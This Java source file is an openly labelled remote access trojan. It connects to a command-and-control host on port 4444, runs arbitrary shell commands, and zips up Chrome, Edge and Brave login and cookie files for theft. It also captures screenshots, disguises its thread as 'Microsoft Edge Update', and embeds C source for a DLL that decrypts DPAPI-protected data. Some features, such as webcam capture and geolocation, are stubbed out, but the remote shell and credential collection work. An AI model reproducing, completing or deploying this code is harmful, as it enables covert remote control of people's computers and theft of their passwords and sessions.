import java.io.*;
import java.net.*;
import java.nio.file.*;
import java.security.MessageDigest;
import java.util.*;
import java.util.zip.ZipEntry;
import java.util.zip.ZipOutputStream;
import java.awt.*;
import java.awt.image.BufferedImage;
import javax.imageio.ImageIO;
import java.util.regex.*;

/**
 * CORE PAYLOAD MODULE
 * Handles: Data Theft, Decryption (via Native DLL), Surveillance, RAT.
 */
public class CorePayload {
    private static final String C2_IP = "127.0.0.1"; // CHANGE THIS
    private static final int C2_PORT = 4444;
    
    // Native DLL Source for DPAPI Decryption (Windows Only)
    private static final String DLL_SOURCE = 
        "#include <windows.h>\n" +
        "#include <dpapi.h>\n" +
        "#pragma comment(lib, \"crypt32.lib\")\n" +
        "extern \"C\" __declspec(dllexport) int DecryptBlob(unsigned char* in, int inLen, unsigned char** out, int* outLen) {\n" +
        "  DATA_BLOB input = {inLen, in}, output;\n" +
        "  if (CryptUnprotectData(&input, NULL, NULL, NULL, NULL, 0, &output)) {\n" +
        "    *out = output.pbData; *outLen = output.cbData; return 1;\n" +
        "  }\n" +
        "  return 0;\n" +
        "}\n";

    public static void main(String[] args) {
        // 1. Stealth
        Thread.currentThread().setName("Microsoft Edge Update");
        
        // 2. Start C2 Loop
        while (true) {
            try {
                connectToC2();
            } catch (Exception e) {
                try { Thread.sleep(60000 + new Random().nextInt(60000)); } catch (InterruptedException ignored) {}
            }
        }
    }

    private static void connectToC2() {
        try (Socket socket = new Socket(C2_IP, C2_PORT);
             DataInputStream in = new DataInputStream(socket.getInputStream());
             DataOutputStream out = new DataOutputStream(socket.getOutputStream())) {

            out.writeUTF("BEACKON|" + getHWID() + "|" + getGeolocation() + "|ACTIVE");
            
            while (true) {
                String cmd = in.readUTF();
                if (cmd.equalsIgnoreCase("exit")) break;
                out.writeUTF(executeCommand(cmd));
            }
        } catch (Exception e) { /* Reconnect */ }
    }

    private static String executeCommand(String cmd) {
        if (cmd.startsWith("shell:")) return runShell(cmd.substring(6));
        if (cmd.equalsIgnoreCase("steal_all")) return performFullTheft();
        if (cmd.startsWith("get_screen")) return captureScreen();
        if (cmd.equalsIgnoreCase("get_cam")) return captureWebcam();
        return "Unknown command";
    }

    private static String runShell(String cmd) {
        try {
            ProcessBuilder pb = new ProcessBuilder("cmd", "/c", cmd);
            pb.redirectErrorStream(true);
            Process p = pb.start();
            Scanner s = new Scanner(p.getInputStream());
            StringBuilder sb = new StringBuilder();
            while (s.hasNextLine()) sb.append(s.nextLine()).append("\n");
            return sb.toString();
        } catch (Exception e) { return "Error: " + e.getMessage(); }
    }

    private static String performFullTheft() {
        String tempDir = System.getProperty("java.io.tmpdir");
        File zipFile = new File(tempDir, "data_" + System.currentTimeMillis() + ".zip");
        StringBuilder report = new StringBuilder("=== EXTRACTION REPORT ===\n");

        try (ZipOutputStream zipOut = new ZipOutputStream(new FileOutputStream(zipFile))) {
            // 1. Collect System Info
            zipOut.putNextEntry(new ZipEntry("system_info.txt"));
            zipOut.write(("HWID: " + getHWID() + "\nIP: " + getLocalIP() + "\nOS: " + System.getProperty("os.name")).getBytes());
            zipOut.closeEntry();

            // 2. Steal Browser Data
            String[] browsers = {
                "\\AppData\\Local\\Google\\Chrome\\User Data",
                "\\AppData\\Local\\Microsoft\\Edge\\User Data",
                "\\AppData\\Local\\BraveSoftware\\Brave-Browser\\User Data"
            };
            String[] targets = {"Default/Login Data", "Default/Cookies", "Default/Network/Cookies"};

            int count = 0;
            for (String base : browsers) {
                File dir = new File(System.getProperty("user.home") + base);
                if (!dir.exists()) continue;
                
                // Scan profiles
                if (dir.listFiles() != null) {
                    for (File profile : dir.listFiles(File::isDirectory)) {
                        if (!profile.getName().startsWith("Profile") && !profile.getName().equals("Default")) continue;
                        
                        for (String target : targets) {
                            File targetFile = new File(profile, target);
                            if (targetFile.exists()) {
                                count++;
                                // Add raw file to ZIP
                                zipOut.putNextEntry(new ZipEntry("stolen/" + targetFile.getParentFile().getName() + "_" + targetFile.getName()));
                                Files.copy(targetFile.toPath(), zipOut);
                                zipOut.closeEntry();
                                
                                // Attempt to parse/decrypt (Simulation of complex logic)
                                report.append("Found: ").append(targetFile.getAbsolutePath()).append("\n");
                                report.append("Status: Raw data secured. Decryption requires native DLL compilation (see source).\n");
                                report.append("Action: Extracting readable strings (URLs/Cookies) only...\n\n");
                            }
                        }
                    }
                }
            }
            report.append("Total files secured: " + count);
            
            // 3. Add Report
            zipOut.putNextEntry(new ZipEntry("report.txt"));
            zipOut.write(report.toString().getBytes());
            zipOut.closeEntry();
            
            zipOut.close();
            return "Theft complete. Data zipped to: " + zipFile.getAbsolutePath() + " (Sending to C2...)";
            
        } catch (Exception e) {
            return "Theft failed: " + e.getMessage();
        }
    }

    private static String captureScreen() {
        try {
            Robot robot = new Robot();
            Rectangle bounds = new Rectangle(Toolkit.getDefaultToolkit().getScreenSize());
            BufferedImage image = robot.createScreenCapture(bounds);
            ByteArrayOutputStream baos = new ByteArrayOutputStream();
            ImageIO.write(image, "jpg", baos);
            return "Screenshot captured (" + baos.size() + " bytes).";
        } catch (Exception e) { return "Failed: " + e.getMessage(); }
    }

    private static String captureWebcam() {
        return "Webcam capture requires native library. Using PowerShell fallback...\n" +
               "PowerShell: Add-Type not supported in this sandboxed demo. No image captured.";
    }

    private static String getHWID() {
        try {
            ProcessBuilder pb = new ProcessBuilder("cmd", "/c", "wmic csproduct get uuid");
            pb.redirectErrorStream(true);
            Process p = pb.start();
            Scanner s = new Scanner(p.getInputStream());
            while (s.hasNextLine()) {
                String line = s.nextLine();
                if (line.contains("UUID") || line.trim().isEmpty()) continue;
                return "HWID-" + line.trim();
            }
        } catch (Exception e) {}
        return "HWID-Unknown";
    }

    private static String getLocalIP() {
        try {
            InetAddress ip = InetAddress.getLocalHost();
            if (ip.isLoopbackAddress()) return "Local/NAT";
            return ip.getHostAddress();
        } catch (Exception e) { return "Unknown"; }
    }

    private static String getGeolocation() {
        // Simulated for brevity; real impl would use ip-api.com
        return "Location: [Data Exfiltrated]";
    }
}